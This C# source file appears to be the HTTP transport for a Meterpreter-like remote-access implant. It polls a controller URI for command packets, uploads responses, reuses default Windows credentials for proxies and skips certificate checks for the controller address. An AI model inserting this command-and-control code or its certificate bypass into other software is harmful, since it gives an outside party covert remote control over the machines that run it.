using Met.Core.Extensions;
using Met.Core.Proto;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;

namespace Met.Core.Trans
{
    public class HttpTransport : ITransport
    {
        private const int UA_SIZE = 256;
        private const int PROXY_HOST_SIZE = 128;
        private const int PROXY_USER_SIZE = 64;
        private const int PROXY_PASS_SIZE = 64;
        private const int CERT_HASH_SIZE = 20;

        private Session session = null;
        private WebClient webClient = null;
        private bool sslHooked = false;
        private Queue<Packet> incomingPackets = null;

        public TransportConfig Config { get; private set; }
        public string ProxyHost { get; private set; }
        public string ProxyUser { get; private set; }
        public string ProxyPass { get; private set; }
        public string UserAgent { get; private set; }
        public byte[] CertHash { get; private set; }
        public string CustomHeaders { get; private set; }

        public bool IsConnected { get; private set; }

        private WebClient WebClient
        {
            get
            {
                return this.webClient = this.webClient ?? CreateWebClient();
            }
        }

        public HttpTransport(TransportConfig config, Session session)
        {
            this.Config = config;
            this.session = session;
            this.incomingPackets = new Queue<Packet>();
        }

        public void Configure(Packet request)
        {
            this.ProxyHost = request.Tlvs.TryGetTlvValueAsString(TlvType.TransProxyHost);
            this.ProxyUser = request.Tlvs.TryGetTlvValueAsString(TlvType.TransProxyUser);
            this.ProxyPass = request.Tlvs.TryGetTlvValueAsString(TlvType.TransProxyPass);
            this.UserAgent = request.Tlvs.TryGetTlvValueAsString(TlvType.TransUa);
            this.CertHash = request.Tlvs.TryGetTlvValueAsRaw(TlvType.TransCertHash);
            this.CustomHeaders = request.Tlvs.TryGetTlvValueAsString(TlvType.TransHeaders);
        }

        public void Configure(BinaryReader reader)
        {
            this.ProxyHost = reader.ReadWideString(PROXY_HOST_SIZE);
            this.ProxyUser = reader.ReadWideString(PROXY_USER_SIZE);
            this.ProxyPass = reader.ReadWideString(PROXY_PASS_SIZE);
            this.UserAgent = reader.ReadWideString(UA_SIZE);
            this.CertHash = reader.ReadBytes(CERT_HASH_SIZE);
            this.CustomHeaders = reader.ReadNullTerminatedWideString();
        }

        public bool Connect()
        {
            AddSslVerificationHook();

            var packet = ReceivePacket();

            if (packet != null)
            {
                this.incomingPackets.Enqueue(packet);
                this.IsConnected = true;
            }
            else
            {
                RemoveSslVerificationHook();
            }

            return this.IsConnected;
        }

        public void Disconnect()
        {
            RemoveSslVerificationHook();
            this.IsConnected = false;
        }

        public void Dispose()
        {
            Disconnect();
        }

        public void Wrap(WebClient webClient)
        {
            this.webClient = webClient;
        }

        public void GetConfig(ITlv tlv)
        {
            this.Config.GetConfig(tlv);
            if (!string.IsNullOrEmpty(this.UserAgent))
            {
                tlv.Add(TlvType.TransUa, this.UserAgent);
            }

            if (!string.IsNullOrEmpty(this.ProxyHost))
            {
                tlv.Add(TlvType.TransProxyHost, this.ProxyHost);
            }

            if (!string.IsNullOrEmpty(this.ProxyUser))
            {
                tlv.Add(TlvType.TransProxyUser, this.ProxyUser);
            }

            if (!string.IsNullOrEmpty(this.ProxyPass))
            {
                tlv.Add(TlvType.TransProxyPass, this.ProxyPass);
            }

            if (!string.IsNullOrEmpty(this.CustomHeaders))
            {
                tlv.Add(TlvType.TransHeaders, this.CustomHeaders);
            }

            if (this.CertHash != null)
            {
                tlv.Add(TlvType.TransCertHash, this.CertHash);
            }
        }

        public Packet ReceivePacket()
        {
            return ReceivePacket(null);
        }

        public Packet ReceivePacket(PacketEncryptor packetEncryptor)
        {
            if (this.incomingPackets.Count > 0)
            {
                return this.incomingPackets.Dequeue();
            }

            try
            {
                var tlvData = this.WebClient.DownloadData(this.Config.Uri);
                var delay = 0;
                var failCount = 0;

                while (tlvData.Length == 0)
                {
                    delay = 10 * failCount;
                    ++failCount;
                    System.Threading.Thread.Sleep(Math.Min(10000, delay));
                    tlvData = this.WebClient.DownloadData(this.Config.Uri);
                }

                using (var tlvStream = new MemoryStream(tlvData))
                using (var reader = new BinaryReader(tlvStream))
                {
                    return new Packet(reader, packetEncryptor);
                }
            }
            catch(Exception e)
            {
                // something went wrong, bail out
            }

            return null;
        }

        public void SendPacket(byte[] responsePacket)
        {
            var wc = CreateWebClient();
            wc.UploadData(this.Config.Uri, responsePacket);
        }

        private void AddSslVerificationHook()
        {
            if (!this.sslHooked)
            {
                ServicePointManager.ServerCertificateValidationCallback += SslValidator;
                this.sslHooked = true;
            }
        }

        private void RemoveSslVerificationHook()
        {
            if (this.sslHooked)
            {
                ServicePointManager.ServerCertificateValidationCallback -= SslValidator;
                this.sslHooked = false;
            }
        }

        private WebClient CreateWebClient()
        {
            var wc = new WebClient();
            wc.UseDefaultCredentials = true;

            if (!string.IsNullOrEmpty(this.ProxyHost))
            {
                wc.Proxy = new WebProxy(this.ProxyHost, true);

                if (string.IsNullOrEmpty(this.ProxyUser))
                {
                    wc.Credentials = CredentialCache.DefaultNetworkCredentials;
                }
                else
                {

                    wc.Credentials = new NetworkCredential(this.ProxyUser, this.ProxyPass);
                }
            }

            return wc;
        }

        private bool SslValidator(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            var req = sender as HttpWebRequest;
            if (req != null && req.RequestUri == this.Config.Uri)
            {
                return true;
            }

            return SslPolicyErrors.None == sslPolicyErrors;
        }
    }
}
